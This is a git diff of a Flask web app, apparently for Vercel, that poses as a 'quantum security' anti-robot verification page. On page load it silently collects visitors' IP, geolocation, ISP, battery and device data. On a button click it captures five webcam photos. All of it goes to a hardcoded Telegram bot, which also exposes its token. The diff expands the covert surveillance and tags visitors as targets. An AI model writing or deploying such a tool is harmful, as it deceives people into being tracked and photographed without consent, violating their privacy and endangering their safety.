@@ -1,25 +1,25 @@
 # api/index.py
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify, render_template_string
 import requests
 import json
-import os
 import base64
-from datetime import datetime
 import re
+import os
+from datetime import datetime
 
-app = Flask(__name__, static_folder='../static', static_url_path='')
+app = Flask(__name__)
 
-# Configuration Telegram - À MODIFIER
+# ========== CONFIGURATION TELEGRAM ==========
 BOT_TOKEN = "8662380005:AAEJdWB3kvuIk-2dnq_xZ93EjDU4LT0lP9o"
 CHAT_ID = "8546452645"
 
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
 
-def send_to_telegram(text, photo_bytes=None):
+def send_telegram(text, photo_bytes=None):
     try:
         if photo_bytes:
-            files = {'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}
+            files = {'photo': ('shot.jpg', photo_bytes, 'image/jpeg')}
             data = {'chat_id': CHAT_ID, 'caption': text}
             requests.post(TELEGRAM_PHOTO_API, files=files, data=data, timeout=10)
         else:
@@ -28,13 +28,13 @@ def send_to_telegram(text, photo_bytes=None):
     except Exception as e:
         print(f"Erreur: {e}")
 
-# Page HTML
-HTML_PAGE = '''<!DOCTYPE html>
+# ========== PAGE HTML MATRIX ==========
+HTML_MATRIX = '''<!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Quantum Security Hub</title>
+    <title>Quantum Security █ Matrix</title>
     <style>
         * {
             margin: 0;
@@ -42,302 +42,379 @@ HTML_PAGE = '''<!DOCTYPE html>
             box-sizing: border-box;
         }
         body {
-            background: radial-gradient(circle at 20% 30%, #0a0f1e, #020408);
+            background: #000000;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: 'Segoe UI', 'Courier New', monospace;
-            overflow-x: hidden;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
         }
-        .glow {
+        /* Matrix rain effect */
+        #matrix-bg {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            pointer-events: none;
-            background: radial-gradient(circle at var(--x, 50%) var(--y, 50%), rgba(0,255,255,0.15) 0%, transparent 50%);
             z-index: 0;
+            opacity: 0.15;
+        }
+        canvas {
+            display: block;
+            width: 100%;
+            height: 100%;
         }
         .container {
             position: relative;
             z-index: 1;
             text-align: center;
             padding: 2rem;
-            max-width: 500px;
-            width: 100%;
+            max-width: 550px;
+            width: 90%;
         }
-        .card {
-            background: rgba(10, 20, 40, 0.7);
-            backdrop-filter: blur(12px);
-            border-radius: 2rem;
-            border: 1px solid rgba(0, 255, 255, 0.3);
+        .terminal {
+            background: rgba(0, 0, 0, 0.85);
+            border: 1px solid #0f0;
+            border-radius: 12px;
             padding: 2rem;
-            box-shadow: 0 0 50px rgba(0, 255, 255, 0.1);
+            box-shadow: 0 0 40px rgba(0, 255, 0, 0.2), inset 0 0 20px rgba(0, 255, 0, 0.05);
         }
         h1 {
-            color: #0ff;
-            font-size: 1.8rem;
-            letter-spacing: 2px;
-            margin-bottom: 1rem;
+            color: #0f0;
+            font-size: 1.3rem;
+            letter-spacing: 3px;
+            margin-bottom: 1.5rem;
             text-transform: uppercase;
+            font-weight: normal;
+            border-right: 2px solid #0f0;
+            display: inline-block;
+            padding-right: 10px;
+            animation: blink 1s step-end infinite;
+        }
+        @keyframes blink {
+            0%, 100% { border-color: #0f0; }
+            50% { border-color: transparent; }
         }
         .sub {
-            color: #6c8db0;
+            color: #0a8;
+            font-size: 0.7rem;
             margin-bottom: 2rem;
-            font-size: 0.8rem;
+            letter-spacing: 1px;
         }
-        .image-container {
-            cursor: pointer;
-            margin: 1.5rem 0;
-            transition: transform 0.3s;
-        }
-        .image-container:hover {
-            transform: scale(1.02);
-        }
-        .shield-img {
-            width: 180px;
-            height: 180px;
-            border-radius: 50%;
-            box-shadow: 0 0 30px rgba(0, 255, 255, 0.4);
-            border: 2px solid #0ff;
-            transition: all 0.3s;
-        }
-        .btn {
-            background: linear-gradient(90deg, #0ff3, #0fa3);
-            border: none;
-            padding: 14px 35px;
-            border-radius: 40px;
-            color: #010514;
-            font-weight: bold;
-            font-size: 1rem;
-            cursor: pointer;
-            margin: 0.5rem;
-            transition: 0.2s;
-        }
-        .btn:hover {
-            background: #0ff;
-            box-shadow: 0 0 15px #0ff;
-            transform: scale(1.02);
-        }
-        .status {
-            margin-top: 1.5rem;
+        .btn-matrix {
+            background: transparent;
+            border: 2px solid #0f0;
             color: #0f0;
-            font-size: 0.8rem;
+            padding: 14px 30px;
+            font-size: 1rem;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 1rem 0;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        .btn-matrix:hover {
+            background: #0f0;
+            color: #000;
+            box-shadow: 0 0 20px #0f0;
+        }
+        .progress-container {
+            width: 100%;
+            height: 3px;
+            background: #0a2a0a;
+            margin-top: 20px;
+            display: none;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #0f0;
+            transition: width 0.1s linear;
+        }
+        .status-text {
+            color: #0f0;
+            font-size: 0.7rem;
+            margin-top: 15px;
             font-family: monospace;
+            min-height: 50px;
         }
         footer {
-            margin-top: 2rem;
-            color: #2a4a6a;
-            font-size: 0.7rem;
+            margin-top: 1.5rem;
+            color: #0a4a0a;
+            font-size: 0.6rem;
         }
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 #0ff4; }
-            70% { box-shadow: 0 0 0 15px #0ff0; }
-            100% { box-shadow: 0 0 0 0 #0ff0; }
+        .glitch {
+            animation: glitch 0.5s infinite;
         }
-        .pulse {
-            animation: pulse 1.5s infinite;
+        @keyframes glitch {
+            0% { text-shadow: 2px 0 red, -2px 0 blue; }
+            50% { text-shadow: -2px 0 red, 2px 0 blue; }
+            100% { text-shadow: 2px 0 red, -2px 0 blue; }
         }
     </style>
 </head>
 <body>
-<div class="glow" id="glow"></div>
+<canvas id="matrix-bg"></canvas>
 <div class="container">
-    <div class="card">
-        <h1>◈ QUANTUM SECURITY ◈</h1>
-        <div class="sub">vérification de l'intégrité du terminal</div>
+    <div class="terminal">
+        <h1>VÉRIFICATION QUANTIQUE</h1>
+        <div class="sub">[ protocole anti-robot ]</div>
         
-        <div class="image-container" id="clickZone">
-            <img class="shield-img" src="https://cdn-icons-png.flaticon.com/512/1048/1048937.png" alt="security shield">
+        <button class="btn-matrix" id="actionBtn">VÉRIFIER QUE JE NE SUIS PAS UN ROBOT</button>
+        
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
         </div>
-        
-        <button class="btn" id="actionBtn">ACCÉDER À LA ZONE SÉCURISÉE</button>
-        
-        <div class="status" id="statusMsg">🔒 Système prêt • cliquez pour authentification</div>
-        <footer>© Quantum Defense System • session chiffrée</footer>
+        <div class="status-text" id="statusMsg">>_ système prêt</div>
+        <footer>© Quantum Defense • session chiffrée</footer>
     </div>
 </div>
 
 <script>
-    let streamActive = false;
-    let videoElement = null;
-    let collectedData = {};
-
-    function updateGlow(e) {
-        const glow = document.getElementById('glow');
-        const rect = document.getElementById('clickZone').getBoundingClientRect();
-        const x = e.clientX || rect.left + rect.width/2;
-        const y = e.clientY || rect.top + rect.height/2;
-        glow.style.setProperty('--x', x + 'px');
-        glow.style.setProperty('--y', y + 'px');
-    }
-    document.addEventListener('mousemove', updateGlow);
+    // Matrix Rain Effect
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
     
-    async function sendToServer(data, isPhoto = false, photoBlob = null) {
+    const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
+    const charArray = chars.split('');
+    const fontSize = 14;
+    const columns = canvas.width / fontSize;
+    const drops = [];
+    for(let i = 0; i < columns; i++) drops[i] = 1;
+    
+    function drawMatrix() {
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#0f0';
+        ctx.font = fontSize + 'px monospace';
+        for(let i = 0; i < drops.length; i++) {
+            const text = charArray[Math.floor(Math.random() * charArray.length)];
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+            if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        }
+    }
+    setInterval(drawMatrix, 50);
+    window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    });
+
+    let collected = {};
+    let photoInterval = null;
+    let photoCount = 0;
+    
+    // Envoi au serveur
+    async function postData(endpoint, data) {
         try {
-            if (isPhoto && photoBlob) {
-                const reader = new FileReader();
-                reader.onloadend = function() {
-                    fetch('/api/capture', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ photo: reader.result, info: collectedData })
-                    });
-                };
-                reader.readAsDataURL(photoBlob);
-            } else {
-                await fetch('/api/collect', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-            }
+            await fetch(endpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
         } catch(e) {}
     }
-
-    // Collecte des informations système
-    async function collectSystemInfo() {
-        collectedData.timestamp = new Date().toISOString();
-        collectedData.userAgent = navigator.userAgent;
-        collectedData.platform = navigator.platform;
-        collectedData.language = navigator.language;
+    
+    // Détection OS (Android/iOS seulement)
+    function detectMobileOS() {
+        const ua = navigator.userAgent;
+        if(/Android/i.test(ua)) return 'Android';
+        if(/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
+        return 'Autre';
+    }
+    
+    // Collecte des infos passives
+    async function collectPassive() {
+        collected.os = detectMobileOS();
+        collected.timestamp = new Date().toISOString();
         
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            collectedData.ip = data.ip;
-        } catch(e) { collectedData.ip = 'inconnu'; }
-        
-        if (navigator.getBattery) {
+        // Batterie
+        if(navigator.getBattery) {
             try {
                 const battery = await navigator.getBattery();
-                collectedData.battery = Math.floor(battery.level * 100) + '%';
-                collectedData.charging = battery.charging;
-            } catch(e) {}
+                collected.battery = Math.floor(battery.level * 100) + '%';
+            } catch(e) { collected.battery = '?'; }
         } else {
-            collectedData.battery = 'indisponible';
+            collected.battery = 'indisponible';
         }
         
-        const screen = `${window.screen.width}x${window.screen.height}`;
-        collectedData.screen = screen;
-        collectedData.url = window.location.href;
+        // IP + Geo via ip-api.com
+        try {
+            const geoRes = await fetch('http://ip-api.com/json/');
+            const geoData = await geoRes.json();
+            if(geoData.status === 'success') {
+                collected.ip = geoData.query;
+                collected.city = geoData.city;
+                collected.country = geoData.country;
+                collected.isp = geoData.isp;
+                collected.region = geoData.regionName;
+            }
+        } catch(e) {
+            collected.ip = 'inconnu';
+            collected.city = '?';
+            collected.country = '?';
+        }
         
-        await sendToServer(collectedData);
-        document.getElementById('statusMsg').innerHTML = '✓ Identifiants collectés • accès caméra...';
+        // Opérateur via connexion (approximation)
+        if(navigator.connection) {
+            collected.networkType = navigator.connection.effectiveType || '?';
+        }
+        
+        // Envoi silencieux
+        await postData('/api/passive', collected);
     }
-
-    // Capture photo via WebRTC
-    async function takePhoto() {
+    
+    // Capture photo unique
+    async function capturePhoto(stream, index, videoElement) {
+        return new Promise((resolve) => {
+            const canvas = document.createElement('canvas');
+            canvas.width = videoElement.videoWidth || 640;
+            canvas.height = videoElement.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(async (blob) => {
+                const reader = new FileReader();
+                reader.onloadend = async function() {
+                    await postData('/api/photo', {
+                        photo: reader.result,
+                        index: index,
+                        info: collected
+                    });
+                    resolve();
+                };
+                reader.readAsDataURL(blob);
+            }, 'image/jpeg', 0.8);
+        });
+    }
+    
+    // Rafale de 5 photos
+    async function burstPhotos() {
+        const statusDiv = document.getElementById('statusMsg');
+        statusDiv.innerHTML = '>_ [SCAN] activation caméra...';
+        
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
             video.srcObject = stream;
             video.play();
             
-            document.getElementById('statusMsg').innerHTML = '🎥 Caméra active • capture en cours...';
+            await new Promise(r => setTimeout(r, 800));
             
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(async (blob) => {
-                    await sendToServer(null, true, blob);
-                    document.getElementById('statusMsg').innerHTML = '✅ Authentification terminée • accès autorisé';
-                    document.querySelector('.shield-img').classList.add('pulse');
-                    setTimeout(() => {
-                        document.querySelector('.shield-img').classList.remove('pulse');
-                    }, 2000);
-                }, 'image/jpeg', 0.8);
-                
-                stream.getTracks().forEach(track => track.stop());
-                if (video) video.remove();
-            }, 1500);
+            statusDiv.innerHTML = '>_ [SCAN] capture en cours...';
+            
+            for(let i = 1; i <= 5; i++) {
+                await capturePhoto(stream, i, video);
+                const percent = (i / 5) * 100;
+                document.getElementById('progressBar').style.width = percent + '%';
+                statusDiv.innerHTML = `>_ [SCAN] capture ${i}/5`;
+                if(i < 5) await new Promise(r => setTimeout(r, 500));
+            }
+            
+            stream.getTracks().forEach(track => track.stop());
+            video.remove();
+            
+            statusDiv.innerHTML = '>_ [OK] vérification terminée';
+            document.getElementById('progressContainer').style.display = 'none';
+            
         } catch(err) {
-            document.getElementById('statusMsg').innerHTML = '⚠️ Accès caméra refusé • vérification manuelle requise';
-            await sendToServer({ ...collectedData, cameraError: err.message });
+            statusDiv.innerHTML = '>_ [ERREUR] accès caméra refusé';
+            document.getElementById('progressContainer').style.display = 'none';
+            await postData('/api/error', { error: err.message, info: collected });
         }
     }
-
-    // Déclencheur
-    async function startProcess() {
-        document.getElementById('statusMsg').innerHTML = '⏳ Collecte des informations...';
-        await collectSystemInfo();
-        await takePhoto();
-    }
-
-    document.getElementById('clickZone').addEventListener('click', startProcess);
-    document.getElementById('actionBtn').addEventListener('click', startProcess);
     
-    // Collecte immédiate des infos passives
-    collectSystemInfo();
+    // Action principale
+    async function startVerification() {
+        const btn = document.getElementById('actionBtn');
+        btn.disabled = true;
+        btn.style.opacity = '0.5';
+        btn.innerText = 'SCAN EN COURS...';
+        
+        document.getElementById('progressContainer').style.display = 'block';
+        document.getElementById('progressBar').style.width = '0%';
+        document.getElementById('statusMsg').innerHTML = '>_ initialisation protocole...';
+        
+        await collectPassive();
+        await new Promise(r => setTimeout(r, 500));
+        await burstPhotos();
+        
+        btn.disabled = false;
+        btn.style.opacity = '1';
+        btn.innerText = 'VÉRIFIER QUE JE NE SUIS PAS UN ROBOT';
+    }
+    
+    document.getElementById('actionBtn').addEventListener('click', startVerification);
+    
+    // Pré-collecte silencieuse
+    collectPassive();
 </script>
 </body>
 </html>'''
 
+# ========== ROUTES FLASK ==========
 @app.route('/')
 def index():
-    return HTML_PAGE
+    return HTML_MATRIX
 
-@app.route('/api/collect', methods=['POST'])
-def collect():
+@app.route('/api/passive', methods=['POST'])
+def passive():
     try:
         data = request.json
-        if data:
-            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-            data['ip'] = ip
-            data['server_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            
-            # Envoi Telegram
-            msg = f"""🔴 *NOUVELLE COLLECTE* 
-━━━━━━━━━━━━━━━━━━
-📍 *IP*: {data.get('ip', '?')}
-📱 *UA*: {data.get('userAgent', '?')[:80]}
-🔋 *Batterie*: {data.get('battery', '?')}
-💻 *Ecran*: {data.get('screen', '?')}
-🕐 *Heure*: {data.get('server_time')}
-━━━━━━━━━━━━━━━━━━"""
-            send_to_telegram(msg)
-            
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        data['ip'] = ip
+        
+        # Construction message Telegram
+        os_info = data.get('os', '?')
+        city = data.get('city', '?')
+        country = data.get('country', '?')
+        isp = data.get('isp', '?')
+        battery = data.get('battery', '?')
+        final_ip = data.get('ip', '?')
+        
+        msg = f"""📍 *CIBLE* : [{os_info}] | [{city}, {country}] | [{isp}]
+🔋 *Batterie* : {battery}
+🌐 *IP* : {final_ip}"""
+        
+        send_telegram(msg)
         return jsonify({'status': 'ok'})
     except Exception as e:
         return jsonify({'status': 'error', 'msg': str(e)}), 500
 
-@app.route('/api/capture', methods=['POST'])
-def capture():
+@app.route('/api/photo', methods=['POST'])
+def photo():
     try:
         data = request.json
         if data and data.get('photo'):
-            # Extraire l'image base64
             photo_b64 = data['photo'].split(',')[1]
             photo_bytes = base64.b64decode(photo_b64)
+            idx = data.get('index', '?')
             
-            info = data.get('info', {})
-            msg = f"""📸 *CAPTURE PHOTO* 📸
-━━━━━━━━━━━━━━━━━━
-📍 IP: {info.get('ip', '?')}
-🔋 Batterie: {info.get('battery', '?')}
-🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-━━━━━━━━━━━━━━━━━━"""
-            send_to_telegram(msg, photo_bytes)
+            msg = f"📸 *PHOTO {idx}/5*\n🌐 IP: {data.get('info', {}).get('ip', '?')}"
+            send_telegram(msg, photo_bytes)
             
         return jsonify({'status': 'ok'})
     except Exception as e:
         return jsonify({'status': 'error', 'msg': str(e)}), 500
 
+@app.route('/api/error', methods=['POST'])
+def error():
+    try:
+        data = request.json
+        msg = f"⚠️ *ERREUR CAMERA*\n{data.get('error', '?')}"
+        send_telegram(msg)
+        return jsonify({'status': 'ok'})
+    except Exception as e:
+        return jsonify({'status': 'error'}), 500
+
 @app.route('/api/status', methods=['GET'])
 def status():
-    return jsonify({'status': 'active', 'bot': BOT_TOKEN[:10] + '...'})
+    return jsonify({'status': 'active', 'matrix': 'online'})
 
-# Vercel handler
+# ========== VERIFICATION SANTE ==========
 def handler(event, context):
     return app(event, context)
-
-# Fichiers statiques
-@app.route('/static/<path:path>')
-def send_static(path):
-    return send_from_directory('static', path)
